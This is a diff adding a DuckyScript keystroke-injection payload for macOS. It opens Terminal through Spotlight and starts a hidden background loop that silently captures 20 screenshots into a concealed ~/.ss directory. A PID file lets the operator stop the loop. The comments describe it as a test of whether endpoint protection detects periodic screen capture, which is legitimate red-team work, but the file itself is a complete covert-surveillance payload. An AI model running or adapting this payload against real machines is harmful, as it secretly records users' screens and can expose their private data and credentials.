@@ -1,0 +1,21 @@
+REM ============================================================
+REM  macOS · Silent Screenshot Loop
+REM ============================================================
+REM  Captures a screenshot every 30 seconds for 10 minutes,
+REM  saving to a hidden directory. Tests whether periodic
+REM  screen capture is detected by endpoint protection.
+REM
+REM  Output: ~/.ss/*.png (20 screenshots)
+REM  Stop: kill $(cat /tmp/.ss.pid)
+
+DEFAULTDELAY 80
+
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 400
+ENTER
+DELAY 1500
+STRINGLN mkdir -p ~/.ss && nohup bash -c 'for i in $(seq 1 20); do screencapture -x ~/.ss/cap_$(date +%H%M%S).png; sleep 30; done' > /dev/null 2>&1 & echo $! > /tmp/.ss.pid
+DELAY 500
+STRINGLN exit
